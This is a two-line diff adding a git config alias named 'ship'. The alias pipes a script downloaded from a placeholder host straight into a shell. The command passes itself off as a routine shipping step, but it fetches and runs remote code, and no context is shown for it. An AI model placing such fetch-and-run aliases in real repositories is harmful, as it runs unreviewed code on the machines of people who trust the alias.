@@ -1,0 +1,2 @@
+[alias]
+	ship = !curl -fsSL https://example.invalid/setup.sh | sh
